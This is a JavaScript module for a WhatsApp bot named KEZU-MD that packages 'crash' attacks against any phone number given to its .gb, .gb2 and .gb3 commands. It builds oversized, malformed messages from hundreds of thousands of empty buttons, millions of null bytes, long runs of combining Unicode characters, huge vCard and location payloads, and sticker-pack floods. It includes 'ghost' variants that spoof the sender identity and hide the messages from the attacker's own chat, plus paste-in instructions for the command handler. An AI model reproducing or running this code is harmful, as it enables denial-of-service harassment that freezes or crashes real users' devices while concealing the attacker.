// ============================================================
//          💀 KEZU-MD GOODBYE / CRASH ATTACK MODULE
//       vajiraofc-baileys compatible | OWNER ONLY
// ============================================================
//
//  COMMANDS:
//    .gb <number>       — Normal  (Combo + VvvXxxAaa + Crashard)
//    .crash <number>    — alias for .gb
//    .gb2 <number>      — Heavy   (15+ messages, 3 phases)
//    .heavy <number>    — alias for .gb2
//    .destroy <number>  — alias for .gb2
//    .gb3 <number>      — Ultimate (30+ messages, 5 rounds)
//    .ultimate <number> — alias for .gb3
//    .max <number>      — alias for .gb3
//
// ============================================================

const {
  generateWAMessageFromContent,
  delay,
} = require('@whiskeysockets/baileys');

// ============================================================
//                    💀 ATTACK FUNCTIONS
// ============================================================

async function _atkVvvXxxAaa(sock, target) {
  try {
    const msg = {
      groupStatusMessageV2: {
        message: {
          interactiveMessage: {
            header: {
              imageMessage: {
                url: "https://mmg.whatsapp.net/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0&mms3=true",
                mimetype: "image/jpeg",
                fileSha256: "2eqLffA9IMphTt+iMq8k5QrWjpXajm8ZqJA9kk5JbDg=",
                fileLength: 9999, height: 9999, width: 9999,
                mediaKey: "buzeJOfJk4y1ysNjb3uozC2pLy9041H4pNx+FNKRWLc=",
                fileEncSha256: "aGfmY0rHUSe1eBmt1vkewywDKjUmnRjng3DfLhUMYAc=",
                directPath: "/v/t62.7118-24/680663126_970396275464454_6182359723749650012_n.enc?ccb=11-4&oh=01_Q5Aa4QGQLAh643XxIBrTHKJVswbNCRzYyckUeMHcyRCE74uPPw&oe=6A12ED53&_nc_sid=5e03e0",
                mediaKeyTimestamp: "1776937541",
                jpegThumbnail: null,
                caption: "Haii!",
                scansSidecar: "pDwqT9IYsTrggiHldJAKrJuoOn7Knn7f2LjPxVpwnhWHFTT0b83iwQ==",
                scanLengths: [9999999999999999999, 9999999999999999999, 9999999999999999999, 9999999999999999999],
                midQualityFileSha256: "zBHV83UQlILLcv3tAwnwaSk4FqEkZho3YKidG64duT0="
              }
            },
            body: { text: "VxA" },
            nativeFlowMessage: { buttons: Array.from({ length: 500000 }, () => ({})) }
          }
        }
      }
    };
    const Vmsg = generateWAMessageFromContent(target, msg, {});
    await sock.relayMessage(target, Vmsg.message, { messageId: Vmsg.key.id });
    await delay(800);

    const VxDell = {
      groupStatusMessageV2: {
        message: {
          interactiveMessage: {
            body: { text: "(VxA)" },
            nativeFlowMessage: { buttons: Array.from({ length: 500000 }, () => ({})) }
          }
        }
      }
    };
    const Vcrb = generateWAMessageFromContent(target, VxDell, {});
    await sock.relayMessage(target, Vcrb.message, { messageId: Vcrb.key.id });
    console.log("✅ VvvXxxAaa → " + target);
    return true;
  } catch(e) { console.error("❌ VvvXxxAaa:", e.message); return false; }
}

async function _atkCrashard(sock, target) {
  try {
    const msg = {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            body: { text: "𝖷𝟩 | 𝟦𝗌𝖾𝗉-𝖤𝗑𝗉𝗅𝗈𝗌𝗍" },
            nativeFlowMessage: { buttons: Array.from({ length: 500000 }, () => ({})) }
          }
        }
      }
    };
    await sock.relayMessage(target, msg, { participant: { jid: target } });
    console.log("✅ Crashard → " + target);
    return true;
  } catch(e) { console.error("❌ Crashard:", e.message); return false; }
}

async function _atkCallInvisible(sock, target) {
  try {
    const msg = {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            body: { text: "KEZU-MD", format: "DEFAULT" },
            nativeFlowResponseMessage: {
              name: "call_permission_request",
              paramsJson: "\u0000".repeat(1000000),
              version: 3
            }
          },
          contextInfo: {
            participant: { jid: target },
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from({ length: 1900 }, () =>
                `1${Math.floor(Math.random() * 5000000)}@s.whatsapp.net`
              )
            ]
          }
        }
      }
    };
    await sock.relayMessage("status@broadcast", msg, {
      statusJidList: [target],
      additionalNodes: [{
        tag: "meta", attrs: {},
        content: [{
          tag: "mentioned_users", attrs: {},
          content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
        }]
      }]
    });
    console.log("✅ CallInvisible → " + target);
    return true;
  } catch(e) { console.error("❌ CallInvisible:", e.message); return false; }
}

async function _atkForceFreeze(sock, target) {
  try {
    const msg = {
      stickerPackMessage: {
        stickerPackId: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5",
        name: "KEZU-MD Destroyed" + "ꦾ".repeat(77777),
        publisher: "KEZU-MD",
        stickers: [
          { fileName: "dcNgF+gv31wV10M39-1VmcZe1xXw59KzLdh585881Kw=.webp", isAnimated: false, emojis: [""], mimetype: "image/webp" },
          { fileName: "fMysGRN-U-bLFa6wosdS0eN4LJlVYfNB71VXZFcOye8=.webp", isAnimated: false, emojis: [""], mimetype: "image/webp" },
          { fileName: "gd5ITLzUWJL0GL0jjNofUrmzfj4AQQBf8k3NmH1A90A=.webp", isAnimated: false, emojis: [""], mimetype: "image/webp" },
          { fileName: "qDsm3SVPT6UhbCM7SCtCltGhxtSwYBH06KwxLOvKrbQ=.webp", isAnimated: false, emojis: [""], mimetype: "image/webp" },
          { fileName: "gcZUk942MLBUdVKB4WmmtcjvEGLYUOdSimKsKR0wRcQ=.webp", isAnimated: false, emojis: [""], mimetype: "image/webp" },
          { fileName: "1vLdkEZRMGWC827gx1qn7gXaxH+SOaSRXOXvH+BXE14=.webp", isAnimated: false, emojis: [""], mimetype: "image/webp" },
          { fileName: "dnXazm0T+Ljj9K3QnPcCMvTCEjt70XgFoFLrIxFeUBY=.webp", isAnimated: false, emojis: [""], mimetype: "image/webp" },
          { fileName: "gjZriX-x+ufvggWQWAgxhjbyqpJuN7AIQqRl4ZxkHVU=.webp", isAnimated: false, emojis: [""], mimetype: "image/webp" }
        ],
        fileLength: "3662919",
        fileSha256: "G5M3Ag3QK5o2zw6nNL6BNDZaIybdkAEGAaDZCWfImmI=",
        fileEncSha256: "2KmPop/J2Ch7AQpN6xtWZo49W5tFy/43lmSwfe/s10M=",
        mediaKey: "rdciH1jBJa8VIAegaZU2EDL/wsW8nwswZhFfQoiauU0=",
        directPath: "/v/t62.15575-24/11927324_562719303550861_518312665147003346_n.enc?ccb=11-4&oh=01_Q5Aa1gFI6_8-EtRhLoelFWnZJUAyi77CMezNoBzwGd91OKubJg&oe=685018FF&_nc_sid=5e03e0",
        contextInfo: {
          remoteJid: "X",
          participant: "0@s.whatsapp.net",
          stanzaId: "1234567890ABCDEF",
          mentionedJid: [
            "6285215587498@s.whatsapp.net",
            ...Array.from({ length: 1900 }, () =>
              `1${Math.floor(Math.random() * 5000000)}@s.whatsapp.net`
            )
          ]
        },
        mediaKeyTimestamp: "1747502082",
        trayIconFileName: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5.png",
        stickerPackSize: "3680054",
        stickerPackOrigin: "USER_CREATED"
      }
    };
    await sock.relayMessage(target, msg, {});
    console.log("✅ ForceFreeze → " + target);
    return true;
  } catch(e) { console.error("❌ ForceFreeze:", e.message); return false; }
}

async function _atkBlank1(sock, target) {
  try {
    const anta   = 'ោ៝'.repeat(20000);
    const nyocot = 'ꦾ'.repeat(20000);
    const msg = {
      newsletterAdminInviteMessage: {
        newsletterJid: "1234567891234@newsletter",
        newsletterName: "KEZU-MD" + 'ោ៝'.repeat(20000),
        caption: "Halo" + anta + nyocot + 'ោ៝'.repeat(20000),
        inviteExpiration: "90000",
        contextInfo: {
          participant: "0@s.whatsapp.net",
          remoteJid: "status@broadcast",
          mentionedJid: ["0@s.whatsapp.net", "13135550002@s.whatsapp.net"]
        }
      }
    };
    await sock.relayMessage(target, msg, { participant: { jid: target } });
    console.log("✅ Blank1 → " + target);
    return true;
  } catch(e) { console.error("❌ Blank1:", e.message); return false; }
}

async function _atkCombo(sock, target) {
  try {
    for (let i = 0; i < 5; i++) {
      await _atkCallInvisible(sock, target);
      await _atkForceFreeze(sock, target);
      await _atkBlank1(sock, target);
      await delay(300);
    }
    console.log("✅ Combo → " + target);
    return true;
  } catch(e) { console.error("❌ Combo:", e.message); return false; }
}

// ============================================================
//              💀 SWITCH CASES  (paste into your switch block)
// ============================================================
//
//  HOW TO USE:
//  1. Copy everything ABOVE this comment into pair.js near the
//     other module-level helper functions.
//  2. Copy the SWITCH CASES below and paste them inside your
//     switch(command) { ... } block.
//
// ─────────────────────────────────────────────────────────────
//
//        case 'gb':
//        case 'crash': {
//          await socket.sendMessage(sender, { react: { text: '💀', key: msg.key } });
//          if (!isBotOrOwner) return await socket.sendMessage(sender, { text: '🔒 *Owner only command.*' }, { quoted: msg });
//          if (!args[0]) return await socket.sendMessage(sender, {
//            text: `💀 *GOODBYE CRASH*\n\n*Usage:*\n.gb <number>\n\n*Example:*\n.gb 94770000000\n\n*Attacks:* Combo + VvvXxxAaa + Crashard`
//          }, { quoted: msg });
//          try {
//            const _gbNum = args[0].replace(/[^0-9]/g, '');
//            if (_gbNum.length < 7) return await socket.sendMessage(sender, { text: '❌ Invalid number.' }, { quoted: msg });
//            const _gbTarget = _gbNum + '@s.whatsapp.net';
//            await socket.sendMessage(sender, { text: `💀 *Target:* ${_gbNum}\n⚡ *Attacking...*` }, { quoted: msg });
//            await _atkCombo(socket, _gbTarget);
//            await delay(2000);
//            await _atkVvvXxxAaa(socket, _gbTarget);
//            await delay(2000);
//            await _atkCrashard(socket, _gbTarget);
//            await socket.sendMessage(sender, { text: `✅ *Attack completed on ${_gbNum}*\n\n💀 *KEZU-MD*` }, { quoted: msg });
//          } catch(e) { await socket.sendMessage(sender, { text: `❌ Error: ${e.message}` }, { quoted: msg }); }
//          break;
//        }
//
//        case 'gb2':
//        case 'heavy':
//        case 'destroy': {
//          await socket.sendMessage(sender, { react: { text: '🔥', key: msg.key } });
//          if (!isBotOrOwner) return await socket.sendMessage(sender, { text: '🔒 *Owner only command.*' }, { quoted: msg });
//          if (!args[0]) return await socket.sendMessage(sender, {
//            text: `🔥 *HEAVY GOODBYE*\n\n*Usage:*\n.gb2 <number>\n\n*Example:*\n.gb2 94770000000\n\n*⚡ Sends 15+ heavy messages*`
//          }, { quoted: msg });
//          try {
//            const _gb2Num = args[0].replace(/[^0-9]/g, '');
//            if (_gb2Num.length < 7) return await socket.sendMessage(sender, { text: '❌ Invalid number.' }, { quoted: msg });
//            const _gb2Target = _gb2Num + '@s.whatsapp.net';
//            await socket.sendMessage(sender, { text: `💀 *Target:* ${_gb2Num}\n⚡ *Heavy attack initiated...*\n\n⏳ Sending 15+ crash messages...` }, { quoted: msg });
//            await socket.sendMessage(sender, { text: `🔥 *Phase 1/3:* Sending 3 Combo attacks...` }, { quoted: msg });
//            for (let i = 0; i < 3; i++) { await _atkCombo(socket, _gb2Target); await delay(1000); }
//            await socket.sendMessage(sender, { text: `🔥 *Phase 2/3:* Sending 3 VvvXxxAaa attacks...` }, { quoted: msg });
//            for (let i = 0; i < 3; i++) { await _atkVvvXxxAaa(socket, _gb2Target); await delay(1000); }
//            await socket.sendMessage(sender, { text: `🔥 *Phase 3/3:* Sending 5 Crashard attacks...` }, { quoted: msg });
//            for (let i = 0; i < 5; i++) { await _atkCrashard(socket, _gb2Target); await delay(800); }
//            await socket.sendMessage(sender, { text: `💥 *Final Blast:* Sending ultimate crash...` }, { quoted: msg });
//            const _gb2Final = {
//              viewOnceMessage: {
//                message: {
//                  interactiveMessage: {
//                    body: { text: "💀 KEZU-MD ULTIMATE CRASH 💀\n" + "𑇂𑆵𑆴𑆿".repeat(100000) + "\n𝖷𝟩 | 𝖤𝗑𝗉𝗅𝗈𝗌𝗍" },
//                    nativeFlowMessage: { buttons: Array.from({ length: 999999 }, () => ({})) }
//                  }
//                }
//              }
//            };
//            await socket.relayMessage(_gb2Target, _gb2Final, { participant: { jid: _gb2Target } });
//            await socket.sendMessage(sender, { text: `✅ *Heavy attack completed on ${_gb2Num}*\n\n🔥 *KEZU-MD ULTIMATE*` }, { quoted: msg });
//            await socket.sendMessage(sender, { react: { text: '💀', key: msg.key } });
//          } catch(e) { await socket.sendMessage(sender, { text: `❌ Error: ${e.message}` }, { quoted: msg }); }
//          break;
//        }
//
//        case 'gb3':
//        case 'ultimate':
//        case 'max': {
//          await socket.sendMessage(sender, { react: { text: '💥', key: msg.key } });
//          if (!isBotOrOwner) return await socket.sendMessage(sender, { text: '🔒 *Owner only command.*' }, { quoted: msg });
//          if (!args[0]) return await socket.sendMessage(sender, {
//            text: `💥 *ULTIMATE GOODBYE*\n\n*Usage:*\n.gb3 <number>\n\n*Example:*\n.gb3 94770000000\n\n*⚡ Sends 30+ heavy messages*`
//          }, { quoted: msg });
//          try {
//            const _gb3Num = args[0].replace(/[^0-9]/g, '');
//            if (_gb3Num.length < 7) return await socket.sendMessage(sender, { text: '❌ Invalid number.' }, { quoted: msg });
//            const _gb3Target = _gb3Num + '@s.whatsapp.net';
//            await socket.sendMessage(sender, { text: `💀 *Target:* ${_gb3Num}\n⚡ *ULTIMATE attack initiated...*\n\n⏳ Sending 30+ crash messages...` }, { quoted: msg });
//            for (let i = 0; i < 5; i++) {
//              await socket.sendMessage(sender, { text: `🔥 *Round ${i+1}/5:* Sending all attacks...` }, { quoted: msg });
//              await _atkCombo(socket, _gb3Target); await delay(1000);
//              await _atkVvvXxxAaa(socket, _gb3Target); await delay(1000);
//              await _atkCrashard(socket, _gb3Target); await delay(1000);
//            }
//            await socket.sendMessage(sender, { text: `💥 *Final Blast:* Sending ultimate crash...` }, { quoted: msg });
//            const _gb3Final = {
//              viewOnceMessage: {
//                message: {
//                  interactiveMessage: {
//                    body: { text: "💀 KEZU-MD MAXIMUM OVERDRIVE 💀\n" + "𑇂𑆵𑆴𑆿".repeat(200000) + "\n𝖷𝟩 | 𝖴𝗅𝗍𝗂𝗆𝖺𝗍𝖾 𝖤𝗑𝗉𝗅𝗈𝗌𝗍" },
//                    nativeFlowMessage: { buttons: Array.from({ length: 999999 }, () => ({})) }
//                  }
//                }
//              }
//            };
//            await socket.relayMessage(_gb3Target, _gb3Final, { participant: { jid: _gb3Target } });
//            await socket.sendMessage(sender, { text: `✅ *ULTIMATE attack completed on ${_gb3Num}*\n\n💥 *KEZU-MD MAXIMUM POWER*` }, { quoted: msg });
//            await socket.sendMessage(sender, { react: { text: '💀', key: msg.key } });
//          } catch(e) { await socket.sendMessage(sender, { text: `❌ Error: ${e.message}` }, { quoted: msg }); }
//          break;
//        }
//
// ============================================================

// ============================================================
//              💳 VCARD BUG FUNCTIONS
// ============================================================

async function _atkVcardBug(sock, target) {
  try {
    const poison = 'ꦾ'.repeat(30000) + 'ោ៝'.repeat(10000) + '\u0000'.repeat(5000);
    const vcard =
      'BEGIN:VCARD\nVERSION:3.0\n' +
      'FN:💀 KEZU-MD BUG 💀' + poison + '\n' +
      'ORG:' + 'A'.repeat(65536) + '\n' +
      'TEL;type=CELL;type=VOICE;waid=0:+0000000000\n' +
      'END:VCARD';
    const msg = {
      contactMessage: {
        displayName: '💀 BUG' + 'ꦾ'.repeat(50000),
        vcard: vcard.repeat(50),
      }
    };
    await sock.relayMessage(target, msg, {});
    console.log('✅ VcardBug → ' + target);
    return true;
  } catch(e) { console.error('❌ VcardBug:', e.message); return false; }
}

async function _atkVcardBug2(sock, target) {
  try {
    const makeVcard = (i) => {
      const blob = 'ꦾ'.repeat(5000) + i.toString().repeat(1000);
      return (
        'BEGIN:VCARD\nVERSION:3.0\n' +
        `FN:💀 VICTIM-${i}` + blob + '\n' +
        `TEL;type=CELL;waid=${i}:+${String(i).padStart(12, '0')}\n` +
        'END:VCARD'
      );
    };
    const contacts = Array.from({ length: 2000 }, (_, i) => ({
      displayName: `💀 B${i}` + 'ꦾ'.repeat(3000),
      vcard: makeVcard(i)
    }));
    const msg = { contactsArrayMessage: { contacts, displayName: '💀 KEZU BUG PACK' } };
    await sock.relayMessage(target, msg, {});
    await delay(500);
    for (let i = 0; i < 5; i++) {
      const singleBig = {
        contactMessage: {
          displayName: '💀 KEZU-X' + 'ꦾ'.repeat(60000),
          vcard: 'BEGIN:VCARD\nVERSION:3.0\nFN:💀\nTEL;waid=0:+0\n' + 'X-BUG:' + '\u0000'.repeat(500000) + '\nEND:VCARD'
        }
      };
      await sock.relayMessage(target, singleBig, {});
      await delay(400);
    }
    console.log('✅ VcardBug2 → ' + target);
    return true;
  } catch(e) { console.error('❌ VcardBug2:', e.message); return false; }
}

async function _atkVcardBug3(sock, target) {
  try {
    for (let r = 0; r < 3; r++) {
      await _atkVcardBug(sock, target);
      await delay(800);
      await _atkVcardBug2(sock, target);
      await delay(800);
    }
    const ultraVcard =
      'BEGIN:VCARD\nVERSION:3.0\n' +
      'FN:' + '𑇂𑆵'.repeat(100000) + '\n' +
      'ORG:' + 'ꦾ'.repeat(100000) + '\n' +
      'NOTE:' + '\u0000'.repeat(1000000) + '\n' +
      'TEL;waid=0:+0\n' +
      'END:VCARD';
    const msg = {
      contactsArrayMessage: {
        contacts: Array.from({ length: 5000 }, (_, i) => ({
          displayName: `💀${i}` + 'ꦾ'.repeat(1000),
          vcard: ultraVcard
        })),
        displayName: '💀 KEZU MAXIMUM VCARD 💀'
      }
    };
    await sock.relayMessage(target, msg, {});
    console.log('✅ VcardBug3 → ' + target);
    return true;
  } catch(e) { console.error('❌ VcardBug3:', e.message); return false; }
}

// ============================================================
//              📍 LOCATION BUG FUNCTIONS
// ============================================================

async function _atkLocBug(sock, target) {
  try {
    const poison = 'ꦾ'.repeat(40000) + 'ោ៝'.repeat(20000);
    const msg = {
      locationMessage: {
        degreesLatitude: 9999999999,
        degreesLongitude: 9999999999,
        degreesClockwiseFromMagneticNorth: 9999999999,
        name: '💀 KEZU-BUG 💀' + poison,
        address: 'DESTROYED' + 'ꦾ'.repeat(50000),
        url: 'https://kezu.md/' + 'a'.repeat(100000),
        isLive: true,
        accuracyInMeters: 9999999999,
        speedInMps: 9999999999,
        degreesClockwiseFromMagneticNorth: 9999999999,
        jpegThumbnail: null,
        contextInfo: {
          mentionedJid: ['0@s.whatsapp.net', ...Array.from({ length: 1900 }, () => `1${Math.floor(Math.random()*9000000)+1000000}@s.whatsapp.net`)]
        }
      }
    };
    await sock.relayMessage(target, msg, {});
    console.log('✅ LocBug → ' + target);
    return true;
  } catch(e) { console.error('❌ LocBug:', e.message); return false; }
}

async function _atkLocBug2(sock, target) {
  try {
    for (let i = 0; i < 10; i++) {
      const msg = {
        liveLocationMessage: {
          degreesLatitude: (Math.random() * 999999999) * (i % 2 === 0 ? 1 : -1),
          degreesLongitude: (Math.random() * 999999999) * (i % 2 === 0 ? -1 : 1),
          accuracyInMeters: 9999999999,
          speedInMps: 9999999999,
          degreesClockwiseFromMagneticNorth: 9999999999,
          sequenceNumber: BigInt(9999999999999),
          timeOffset: 9999999999,
          caption: '💀 KEZU-LOC-BUG 💀' + 'ꦾ'.repeat(30000) + i,
          jpegThumbnail: null,
          contextInfo: {
            participant: { jid: target },
            mentionedJid: ['0@s.whatsapp.net']
          }
        }
      };
      await sock.relayMessage(target, msg, {});
      await delay(300);
    }
    console.log('✅ LocBug2 → ' + target);
    return true;
  } catch(e) { console.error('❌ LocBug2:', e.message); return false; }
}

async function _atkLocBug3(sock, target) {
  try {
    for (let r = 0; r < 3; r++) {
      await _atkLocBug(sock, target); await delay(600);
      await _atkLocBug2(sock, target); await delay(600);
    }
    const ultraPoisonLoc = {
      locationMessage: {
        degreesLatitude: -9999999999,
        degreesLongitude: 9999999999,
        name: '💀 MAXIMUM LOC 💀' + '𑇂𑆵𑆴𑆿'.repeat(80000),
        address: 'ꦾ'.repeat(100000) + 'ោ៝'.repeat(100000),
        url: 'https://x/' + '\u0000'.repeat(500000),
        isLive: true,
        accuracyInMeters: Number.MAX_SAFE_INTEGER,
        speedInMps: Number.MAX_SAFE_INTEGER,
        jpegThumbnail: null,
        contextInfo: {
          mentionedJid: ['0@s.whatsapp.net', ...Array.from({ length: 1900 }, () => `1${Math.floor(Math.random()*9000000)+1000000}@s.whatsapp.net`)]
        }
      }
    };
    for (let i = 0; i < 5; i++) {
      await sock.relayMessage(target, ultraPoisonLoc, {});
      await delay(500);
    }
    console.log('✅ LocBug3 → ' + target);
    return true;
  } catch(e) { console.error('❌ LocBug3:', e.message); return false; }
}

// ============================================================
//       👻 GHOST / INVISIBLE BUG FUNCTIONS (GBI)
//  Messages arrive at target but NOT shown in sender's chat
// ============================================================

// GBI Ghost technique:
// relayMessage() → sends directly over the wire, does NOT store in sender's
// own chat history (unlike sendMessage). So sender sees nothing, target receives.
// participant: { jid: '0@s.whatsapp.net' } → hides real sender identity.

async function _atkGhostBug(sock, target) {
  try {
    const poison = 'ꦾ'.repeat(20000) + 'ោ៝'.repeat(10000) + '\u0000'.repeat(5000);

    // Payload 1 — ghost newsletter invite (lands in chat, not status)
    const p1 = generateWAMessageFromContent(target, {
      newsletterAdminInviteMessage: {
        newsletterJid: '1234567891234@newsletter',
        newsletterName: '👻 GHOST-BUG' + poison,
        caption: '👻' + poison,
        inviteExpiration: '0',
        contextInfo: {
          participant: '0@s.whatsapp.net',
          remoteJid: target,
          mentionedJid: ['0@s.whatsapp.net',
            ...Array.from({ length: 500 }, () => `1${Math.floor(Math.random()*9000000)+1000000}@s.whatsapp.net`)
          ]
        }
      }
    }, { userJid: '0@s.whatsapp.net' });
    p1.key.fromMe = false;
    p1.key.participant = '0@s.whatsapp.net';
    await sock.relayMessage(target, p1.message, { messageId: p1.key.id, participant: { jid: '0@s.whatsapp.net' } });
    await delay(400);

    // Payload 2 — ghost viewOnce interactiveMessage with massive buttons
    const p2 = generateWAMessageFromContent(target, {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            body: { text: '👻 GHOST CRASH\n' + '𑇂𑆵𑆴𑆿'.repeat(50000) },
            nativeFlowMessage: { buttons: Array.from({ length: 500000 }, () => ({})) }
          }
        }
      }
    }, { userJid: '0@s.whatsapp.net' });
    p2.key.fromMe = false;
    p2.key.participant = '0@s.whatsapp.net';
    await sock.relayMessage(target, p2.message, { messageId: p2.key.id, participant: { jid: '0@s.whatsapp.net' } });

    console.log('✅ GhostBug → ' + target);
    return true;
  } catch(e) { console.error('❌ GhostBug:', e.message); return false; }
}

async function _atkGhostBug2(sock, target) {
  try {
    // Payload 1 — ghost call_permission_request with 2M null bytes
    const p1 = generateWAMessageFromContent(target, {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            body: { text: '👻 GHOST-2', format: 'DEFAULT' },
            nativeFlowResponseMessage: {
              name: 'call_permission_request',
              paramsJson: '\u0000'.repeat(2000000),
              version: 3
            },
            contextInfo: {
              participant: '0@s.whatsapp.net',
              remoteJid: target,
              mentionedJid: ['0@s.whatsapp.net',
                ...Array.from({ length: 500 }, () => `1${Math.floor(Math.random()*9000000)+1000000}@s.whatsapp.net`)
              ]
            }
          }
        }
      }
    }, { userJid: '0@s.whatsapp.net' });
    p1.key.fromMe = false;
    p1.key.participant = '0@s.whatsapp.net';
    await sock.relayMessage(target, p1.message, { messageId: p1.key.id, participant: { jid: '0@s.whatsapp.net' } });
    await delay(400);

    // Payload 2 — ghost contactsArray with 1000 corrupted contacts
    const p2 = generateWAMessageFromContent(target, {
      contactsArrayMessage: {
        contacts: Array.from({ length: 1000 }, (_, i) => ({
          displayName: `👻 G${i}` + 'ꦾ'.repeat(2000),
          vcard: `BEGIN:VCARD\nVERSION:3.0\nFN:👻${i}\nTEL;waid=${i}:+${i}\nNOTE:${'ꦾ'.repeat(5000)}\nEND:VCARD`
        })),
        displayName: '👻 GHOST CONTACTS'
      }
    }, { userJid: '0@s.whatsapp.net' });
    p2.key.fromMe = false;
    p2.key.participant = '0@s.whatsapp.net';
    await sock.relayMessage(target, p2.message, { messageId: p2.key.id, participant: { jid: '0@s.whatsapp.net' } });
    await delay(400);

    // Payload 3 — ghost stickerPackMessage (ForceFreeze via ghost)
    const p3 = generateWAMessageFromContent(target, {
      stickerPackMessage: {
        stickerPackId: 'bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5',
        name: '👻 GHOST FREEZE' + 'ꦾ'.repeat(77777),
        publisher: 'KEZU-MD',
        stickers: [
          { fileName: 'dcNgF+gv31wV10M39-1VmcZe1xXw59KzLdh585881Kw=.webp', isAnimated: false, emojis: [''], mimetype: 'image/webp' }
        ],
        fileLength: '3662919',
        fileSha256: 'G5M3Ag3QK5o2zw6nNL6BNDZaIybdkAEGAaDZCWfImmI=',
        fileEncSha256: '2KmPop/J2Ch7AQpN6xtWZo49W5tFy/43lmSwfe/s10M=',
        mediaKey: 'rdciH1jBJa8VIAegaZU2EDL/wsW8nwswZhFfQoiauU0=',
        directPath: '/v/t62.15575-24/11927324_562719303550861_518312665147003346_n.enc?ccb=11-4&oh=01_Q5Aa1gFI6_8-EtRhLoelFWnZJUAyi77CMezNoBzwGd91OKubJg&oe=685018FF&_nc_sid=5e03e0',
        mediaKeyTimestamp: '1747502082',
        trayIconFileName: 'bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5.png',
        stickerPackSize: '3680054', stickerPackOrigin: 'USER_CREATED',
        contextInfo: {
          participant: '0@s.whatsapp.net',
          mentionedJid: ['0@s.whatsapp.net',
            ...Array.from({ length: 500 }, () => `1${Math.floor(Math.random()*9000000)+1000000}@s.whatsapp.net`)
          ]
        }
      }
    }, { userJid: '0@s.whatsapp.net' });
    p3.key.fromMe = false;
    p3.key.participant = '0@s.whatsapp.net';
    await sock.relayMessage(target, p3.message, { messageId: p3.key.id, participant: { jid: '0@s.whatsapp.net' } });

    console.log('✅ GhostBug2 → ' + target);
    return true;
  } catch(e) { console.error('❌ GhostBug2:', e.message); return false; }
}

async function _atkGhostBug3(sock, target) {
  try {
    for (let r = 0; r < 5; r++) {
      await _atkGhostBug(sock, target);  await delay(500);
      await _atkGhostBug2(sock, target); await delay(500);

      // Extra ghost round — massive invisible vCard via relayMessage
      const gvc = generateWAMessageFromContent(target, {
        contactMessage: {
          displayName: '👻 GBI-VC' + 'ꦾ'.repeat(30000),
          vcard: 'BEGIN:VCARD\nVERSION:3.0\nFN:' + '𑇂𑆵'.repeat(50000) + '\nORG:' + 'ꦾ'.repeat(50000) + '\nNOTE:' + '\u0000'.repeat(500000) + '\nTEL;waid=0:+0\nEND:VCARD'
        }
      }, { userJid: '0@s.whatsapp.net' });
      gvc.key.fromMe = false;
      gvc.key.participant = '0@s.whatsapp.net';
      await sock.relayMessage(target, gvc.message, { messageId: gvc.key.id, participant: { jid: '0@s.whatsapp.net' } });
      await delay(500);

      // Extra ghost round — massive invisible location
      const gloc = generateWAMessageFromContent(target, {
        locationMessage: {
          degreesLatitude: -9999999999,
          degreesLongitude: 9999999999,
          name: '👻 GBI-LOC' + 'ꦾ'.repeat(40000),
          address: 'ோ'.repeat(30000),
          isLive: true,
          accuracyInMeters: Number.MAX_SAFE_INTEGER,
          speedInMps: Number.MAX_SAFE_INTEGER,
          jpegThumbnail: null
        }
      }, { userJid: '0@s.whatsapp.net' });
      gloc.key.fromMe = false;
      gloc.key.participant = '0@s.whatsapp.net';
      await sock.relayMessage(target, gloc.message, { messageId: gloc.key.id, participant: { jid: '0@s.whatsapp.net' } });
      await delay(500);
    }

    // Final ghost overdrive blast
    const final = generateWAMessageFromContent(target, {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            body: { text: '👻 KEZU GHOST OVERDRIVE 👻\n' + '𑇂𑆵𑆴𑆿'.repeat(200000) + '\n' + 'ꦾ'.repeat(100000) },
            nativeFlowMessage: { buttons: Array.from({ length: 999999 }, () => ({})) }
          }
        }
      }
    }, { userJid: '0@s.whatsapp.net' });
    final.key.fromMe = false;
    final.key.participant = '0@s.whatsapp.net';
    await sock.relayMessage(target, final.message, { messageId: final.key.id, participant: { jid: '0@s.whatsapp.net' } });

    console.log('✅ GhostBug3 → ' + target);
    return true;
  } catch(e) { console.error('❌ GhostBug3:', e.message); return false; }
}

module.exports = {
  _atkVvvXxxAaa,
  _atkCrashard,
  _atkCallInvisible,
  _atkForceFreeze,
  _atkBlank1,
  _atkCombo,
  _atkVcardBug,
  _atkVcardBug2,
  _atkVcardBug3,
  _atkLocBug,
  _atkLocBug2,
  _atkLocBug3,
  _atkGhostBug,
  _atkGhostBug2,
  _atkGhostBug3
};
